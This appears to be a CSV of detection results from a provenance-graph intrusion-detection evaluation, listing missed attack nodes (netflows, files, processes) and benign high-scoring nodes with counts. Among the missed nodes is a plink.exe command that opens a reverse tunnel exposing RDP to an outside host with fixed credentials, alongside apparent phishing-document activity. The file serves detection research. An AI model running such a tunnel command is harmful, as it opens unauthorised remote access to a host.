node_group,dst_label,count,fraction
FN_below_threshold,netflow 142.20.57.246:53474->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53473->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53472->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53471->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53470->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53456->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53455->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53454->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53453->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53452->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53451->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53450->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53449->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53447->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53446->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53445->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53444->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53443->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53442->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53441->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53440->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53439->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53438->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53437->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53436->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53435->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53434->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53433->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53432->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53430->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53429->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53428->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53421->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53420->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53419->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53418->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53417->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53416->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53411->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53401->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53400->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53399->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53394->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53393->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53396->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53395->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53385->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53384->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53383->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53382->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53381->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53380->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53379->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53378->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53376->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53375->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53374->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53369->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53366->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53363->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53360->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53357->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53354->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53351->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53349->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53348->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53373->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53372->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53368->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53362->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53359->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53356->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53353->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53350->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53346->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53344->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53342->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53340->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53338->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53336->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53334->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53332->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53330->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53328->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53326->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53324->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53320->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53319->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53318->202.6.172.98:443,1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/plink.exe | ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53415->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53414->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53402->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53392->202.6.172.98:443,1,0.001336898
FN_below_threshold,netflow 142.20.57.246:53390->202.6.172.98:443,1,0.001336898
FN_below_threshold,file: /Device/HarddiskVolume1/Windows/system32/mobsync.exe,1,0.001336898
FN_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/mobsync.exe,1,0.001336898
FN_below_threshold,"subject: /Device/HarddiskVolume1/Windows/system32/svchost.exe | ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"",1,0.001336898
FN_below_threshold,subject: /Device/HarddiskVolume1/Windows/System32/svchost.exe | C:/Windows/System32/svchost.exe -k utcsvc,1,0.001336898
TN_high_below_threshold,file: /Device/HarddiskVolume1/ncr/kickoff/input/usernames.csv,11,0.022000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/Windows Live/Bici/EmptyNoOpt.sqm,10,0.020000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/Windows Live/Bici/EmptyOptIn.sqm,8,0.016000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/WDI/LogFiles/SecondaryLogonCKCL.etl,5,0.010000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/system32/WDI/LogFiles/SecondaryLogonCKCL.etl,4,0.008000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Roaming/Microsoft/Office/Recent/documents.LNK,4,0.008000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/MSOIdentityCRL/Tracing/msoidLiteTrace{9317BCB6-314B-442F-A5DA-9BC2BEBC271D}.txt,4,0.008000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/ArmUI.ini,4,0.008000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/RtBackup/EtwRTMsDiagProv.etl,3,0.006000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/microsoft/MSOIdentityCRL/Tracing/msoidLiteTrace{9317BCB6-314B-442F-A5DA-9BC2BEBC271D}.txt,3,0.006000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/WINDOWS/TEMP/ARMUI.INI,3,0.006000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/BPYT4F0V/www.bing[1].xml,3,0.006000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/system32/WDI/LogFiles/ShutdownCKCL.etl,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/RtBackup/EtwRTMsULtrace.etl,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/Windows Live/Bici/_02.sqm,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/bookmarkbackups/bookmarks-2019-09-23.jsonlz4,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/bookmarkbackups/bookmarks-2019-09-24.jsonlz4.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/safebrowsing,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/ActionCenterCache/windows-systemtoast-securityandmaintenance_108_0.png,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/ActionCenterCache/windows-systemtoast-securityandmaintenance_106_0.png,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/sessionCheckpoints.json.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/sessionCheckpoints.json.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/xulstore.json.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/sessionCheckpoints.json,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/datareporting/aborted-session-ping.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/datareporting/aborted-session-ping.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/sessionstore-backups/recovery.js,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/sessionstore-backups/recovery.js,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Roaming/Microsoft/Office/Recent/MARSHAL BOARD.LNK,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/mozilla-temp-files,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/vmware-vmsvc.log,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/__PSScriptPolicyTest_bj4nvclu.cqp.ps1,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/microsoft.windows.cortana_cw5n1h2txyewy/AC/TokenBroker/Cache/b35bd3669fc77ca091833e458e71c2e67bf574f4.tbres,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp3E0A.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp1238.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmpDF43.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/windows/temp/tmpfkyzha,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/users/bantonio/appdata/local/temp/tmpt9mazf/user.js,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Microsoft/Windows/Notifications/WPNPRMRY.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/Switches.xml,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp248.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp3AB6.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp4541.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmp551C.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmpF102.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmpD866.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmp34FE.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmpC4E2.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/tmp276B.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/TEMP/Switches.xml,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/USERS/BANTONIO/APPDATA/LOCAL/TEMP/ARMUI.INI,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{1abc9db5-ffa9-4c4a-8b95-bd4efce434eb},2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{147bd01c-a18c-4d8b-89a2-44465b49dabf},2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/microsoft.windows.cortana_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/BPYT4F0V/www.bing[1].xml,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp159.tmp,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/AC,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{7c4d6573-d153-4d47-95f1-6ce63b67fdda},2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Roaming/Microsoft/Office/Recent/Framework_Sustain_V.94.LNK,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Temp/ArmUI.ini,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache132138905922684689.txt~RF4f28d5d.TMP,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache132138761478307534.txt~RF41625f7.TMP,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache132138617935467146.txt~RF33b1cc8.TMP,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache132138473478417129.txt~RF25eb09f.TMP,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/sysadmin/AppData/Local/Packages/Microsoft.Windows.Cortana_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache132138193509759968.txt~RFb6d125.TMP,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/ArmUI.ini,2,0.004000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/WDI/LogFiles/ShutdownCKCL.etl,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/LwtNetLog.etl,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/RtBackup/EtwRTrundownCollector.etl,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/Wifi.etl,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/System32/LogFiles/WMI/RtBackup/EtwRTDiagtrack-Listener.etl,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/Temp/tmp6897.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/$LogFile,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Windows/SysWOW64/config/systemprofile/AppData/Local/Microsoft/OneDrive/setup/logs/Uninstall_2019-09-23_093301_88-1614.log,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/bookmarkbackups/bookmarks-2019-09-23.jsonlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/bookmarkbackups/bookmarks-2019-09-24.jsonlz4,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/safebrowsing,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/safebrowsing,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/safebrowsing-updating,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/safebrowsing-updating,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/safebrowsing-updating,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/datareporting/archived/2019-09/1569232673330.d0358b99-bbf6-40f7-a5d6-fade5eb166ac.modules.jsonlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/datareporting/archived/2019-09/1569342541143.d4d23c30-2e68-4cc1-b33d-aa321d938435.modules.jsonlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/USERS/BANTONIO/APPDATA/LOCAL/MICROSOFT/WINDOWS/ACTIONCENTERCACHE/WINDOWS-SYSTEMTOAST-SECURITYANDMAINTENANCE_83_0.PNG,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/containers.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/containers.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/containers.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/sessionCheckpoints.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/mimeTypes.rdf,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/times.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/times.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/times.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/sessionstore.js.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/sessionstore.js.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/sessionstore.js.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/prefs-1.js,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/prefs-1.js,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/mimeTypes-1.rdf,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/mimeTypes-1.rdf,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Roaming/Microsoft/Office/Recent/REPRESENTATIVE_TELLER_MEMO_V.71.LNK,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Roaming/Microsoft/Office/Recent/Private-Evacuate-V67.LNK,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/xulstore.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/xulstore.json.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/search.json.mozlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/search.json.mozlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/search.json.mozlz4.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/prefs.js,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/pluginreg.dat.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/pluginreg.dat.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/documents/~$Private-Evacuate-V67.pptx,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/safebrowsing-backup,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/safebrowsing-backup,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.w9km2oiOwNcE/safebrowsing-backup,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.iwTJ6JIN6BTn/datareporting/aborted-session-ping.tmp,1,0.002000000
TN_high_below_threshold,file: /Device/HarddiskVolume1/Users/bantonio/AppData/Local/Temp/rust_mozprofile.wyxbXmiEn1Hs/datareporting/state.json.tmp,1,0.002000000
